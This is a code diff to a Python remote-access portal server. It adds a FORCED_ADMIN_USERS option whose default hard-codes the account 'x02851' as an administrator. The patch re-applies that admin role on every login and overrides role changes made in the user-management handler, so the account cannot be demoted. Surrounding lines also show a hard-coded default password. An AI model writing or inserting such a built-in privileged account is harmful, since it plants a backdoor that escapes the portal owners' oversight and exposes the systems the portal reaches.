@@ -61,6 +61,7 @@ BIND_ADDRESS = CONFIG.get("BIND_ADDRESS", "0.0.0.0")
 AUTH_PASSWORD = CONFIG.get("AUTH_PASSWORD", "nho1234567")
 WINDOWS_AUTH_HEADER = CONFIG.get("WINDOWS_AUTH_HEADER", "X-Remote-User")
 WINDOWS_AUTH_WHITELIST = CONFIG.get("WINDOWS_AUTH_WHITELIST", "")
+FORCED_ADMIN_USERS = CONFIG.get("FORCED_ADMIN_USERS", "x02851")
 TRUSTED_AUTH_PROXY_IPS = CONFIG.get("TRUSTED_AUTH_PROXY_IPS", "")
 RDP_SIGN_THUMBPRINT = CONFIG.get("RDP_SIGN_THUMBPRINT", "").replace(" ", "")
 RDP_CERT_SUBJECT = CONFIG.get("RDP_CERT_SUBJECT", "CN=EnvPortal RDP Signing")
@@ -83,6 +84,14 @@ GUACAMOLE_DRIVE_LAST_CLEANUP = 0
 
 def json_bytes(payload):
     return json.dumps(payload, ensure_ascii=False).encode("utf-8")
+
+
+def forced_admin_users():
+    return {normalize_windows_user(user) for user in FORCED_ADMIN_USERS.split(",") if normalize_windows_user(user)}
+
+
+def is_forced_admin_user(user):
+    return normalize_windows_user(user) in forced_admin_users()
 
 
 PORTAL_CSV_FIELDS = [
@@ -786,6 +795,7 @@ def user_profile_for(user, is_initial_admin=False, client_ip="", metadata=None):
     normalized = normalize_windows_user(user)
     if not normalized:
         return {"user": "", "role": "staff", "canEdit": False, "canManageUsers": False}
+    forced_admin = is_forced_admin_user(normalized)
     users = load_users()
     now = now_text()
     record = users.get(normalized)
@@ -793,7 +803,7 @@ def user_profile_for(user, is_initial_admin=False, client_ip="", metadata=None):
         record = {
             "user": normalized,
             "displayName": metadata.get("displayName") or user or normalized,
-            "role": "admin" if is_initial_admin else "staff",
+            "role": "admin" if (is_initial_admin or forced_admin) else "staff",
             "firstSeen": now,
             "lastSeen": now,
             "firstIp": client_ip or "",
@@ -812,6 +822,8 @@ def user_profile_for(user, is_initial_admin=False, client_ip="", metadata=None):
             record["lastIp"] = client_ip
         if record.get("role") not in role_keys():
             record["role"] = "staff"
+        if forced_admin:
+            record["role"] = "admin"
         for key in ("email", "department", "title"):
             if metadata.get(key):
                 record[key] = metadata[key]
@@ -2291,6 +2303,8 @@ class EnvPortalHandler(SimpleHTTPRequestHandler):
                         role = record.get("role", "staff")
                         if role not in role_keys():
                             role = "staff"
+                        if is_forced_admin_user(normalized):
+                            role = "admin"
                         old = current.get(normalized, {})
                         cleaned[normalized] = {
                             "user": normalized,
